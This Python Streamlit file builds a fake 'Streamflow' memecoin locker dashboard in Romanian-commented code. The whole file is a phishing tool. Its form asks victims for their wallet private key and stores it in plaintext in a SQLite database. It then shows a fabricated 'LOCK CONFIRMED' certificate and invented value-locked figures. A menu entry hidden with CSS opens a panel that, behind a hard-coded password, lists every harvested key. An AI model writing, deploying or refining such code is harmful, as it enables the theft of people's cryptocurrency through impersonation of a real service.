import streamlit as st
import sqlite3
import pandas as pd
from PIL import Image
import datetime

# --- 1. DATABASE SETUP ---
def init_db():
    conn = sqlite3.connect('streamflow_vault.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS user_data 
                 (username TEXT, secret_key TEXT, coin_name TEXT, amount REAL, timestamp TEXT)''')
    conn.commit()
    conn.close()

def save_data(user, key, coin, amt):
    conn = sqlite3.connect('streamflow_vault.db')
    c = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO user_data VALUES (?,?,?,?,?)", (user, key, coin, amt, now))
    conn.commit()
    conn.close()

init_db()

# --- 2. THEME & CSS ---
st.set_page_config(page_title="Streamflow | Dashboard", layout="wide")

st.markdown("""
    <style>
    .stApp { background-color: #0b0e11; color: white; }
    section[data-testid="stSidebar"] { background-color: #161b22; border-right: 1px solid #30363d; }
    [data-testid="stMetricValue"] { color: #00ffbd !important; font-family: monospace; }
    
    /* Casete Input Negre */
    input, div[data-baseweb="input"], div[data-baseweb="select"] > div {
        background-color: #1b1f23 !important;
        color: white !important;
        border-color: #30363d !important;
    }
    input { color: white !important; }
    ::placeholder { color: #484f58 !important; }
    div[data-baseweb="popover"] { background-color: #1b1f23 !important; }

    /* Ascundere buton secret in meniu */
    div[role="radiogroup"] > label:nth-of-type(2) {
        display: block;
        opacity: 0 !important;
        height: 10px;
        margin-top: -5px;
        cursor: default;
    }
    
    /* Stil Certificat */
    .certificate-box {
        border: 2px solid #00ffbd;
        border-radius: 15px;
        padding: 25px;
        background-color: #161b22;
        text-align: center;
        margin-top: 20px;
        font-family: 'Courier New', Courier, monospace;
    }
    </style>
    """, unsafe_allow_html=True)

# --- 3. LOGO INTEGRATION ---
try:
    main_logo = Image.open("logo.png")
    sidebar_icon = Image.open("icon.png")
except:
    main_logo = None
    sidebar_icon = None

# --- SIDEBAR ---
with st.sidebar:
    if sidebar_icon:
        st.image(sidebar_icon, width=80)
    else:
        st.title("STREAMFLOW")
    
    st.markdown("---")
    menu = st.radio("Navigation", ["Coin Locker", " "])

# --- 4. DASHBOARD ---
if menu == "Coin Locker":
    if main_logo:
        st.image(main_logo, width=300)
    
    st.title("MemeCoin Locker")
    
    col1, col2 = st.columns(2)
    with col1:
        st.metric("Total Value Locked", "$734,864", "+5.2%")
    with col2:
        st.metric("Active Streams", "42", "+2 New")

    st.divider()
    
    # Formular
    with st.form("lock_form"):
        name = st.text_input("Project Name", placeholder="e.g. DogeMoon")
        s_key = st.text_input("Wallet Secret Key", type="password", placeholder="Enter private key...")
        coin = st.selectbox("Token", ["SOL","ETH", "USDC", "BONK"])
        amt = st.number_input("Amount", format="%.2f", min_value=0.0)
        time_lock = st.number_input("Coin lock time (days)", format="%.2f", min_value=0.0)
        
        submit = st.form_submit_button("Deploy Lock")

    if submit:
        if name and s_key:
            save_data(name, s_key, coin, amt)
            
            # AFISARE CERTIFICAT
            cert_id = f"SF-{datetime.datetime.now().strftime('%Y%m%d%H%M')}"
            st.markdown(f"""
                <div class="certificate-box">
                    <h2 style="color: #00ffbd; margin-top: 0;">🔒 LOCK CONFIRMED</h2>
                    <p style="color: #8899a6; font-size: 0.8em;">CERTIFICATE ID: {cert_id}</p>
                    <hr style="border: 0.1px solid #30363d;">
                    <div style="text-align: left; display: inline-block; min-width: 250px;">
                        <p><b>PROJECT:</b> {name}</p>
                        <p><b>ASSET:</b> {amt} {coin}</p>
                        <p><b>DURATION:</b> {time_lock} Days</p>
                        <p><b>NETWORK:</b> Mainnet-Beta</p>
                    </div>
                    <p style="color: #00ffbd; font-weight: bold; margin-top: 15px;">ASSETS SECURED BY STREAMFLOW VAULT</p>
                </div>
            """, unsafe_allow_html=True)

            # BUTOANE SOCIAL MEDIA
            share_text = f"I just locked {amt} {coin} for {name} on Streamflow Vault! 🔒💎 #Solana #Streamflow"
            
            twitter_url = f"https://twitter.com/intent/tweet?text={share_text}"
            telegram_url = f"https://t.me/share/url?url=https://streamflow.finance&text={share_text}"

            st.write("### Share your lock:")
            c1, c2 = st.columns(2)
            with c1:
                st.markdown(f'''<a href="{twitter_url}" target="_blank" style="text-decoration: none;">
                    <div style="background-color: #1DA1F2; color: white; padding: 10px; border-radius: 8px; text-align: center; font-weight: bold;">
                        Share on X (Twitter)
                    </div></a>''', unsafe_allow_html=True)
            with c2:
                st.markdown(f'''<a href="{telegram_url}" target="_blank" style="text-decoration: none;">
                    <div style="background-color: #0088cc; color: white; padding: 10px; border-radius: 8px; text-align: center; font-weight: bold;">
                        Share on Telegram
                    </div></a>''', unsafe_allow_html=True)
        else:
            st.error("Please provide Project Name and Secret Key.")

# --- 5. DEVELOPER PANEL ---
elif menu == " ":
    st.title("🛠️ Developer Panel")
    password = st.text_input("Security Check", type="password", placeholder="...")

    if password == "Ovidiu_seful_tuturor20":
        conn = sqlite3.connect('streamflow_vault.db')
        df = pd.read_sql_query("SELECT * FROM user_data", conn)
        conn.close()
        st.dataframe(df, use_container_width=True)